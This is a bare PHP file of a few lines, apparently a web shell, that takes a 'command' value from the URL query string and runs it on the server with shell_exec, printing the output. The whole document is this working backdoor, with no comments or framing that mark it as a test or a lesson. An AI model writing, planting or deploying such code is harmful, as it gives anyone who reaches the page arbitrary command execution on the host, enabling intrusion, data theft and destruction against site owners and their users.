<?php
  $cmd = $_GET['command'];
  echo shell_exec($cmd);
?>
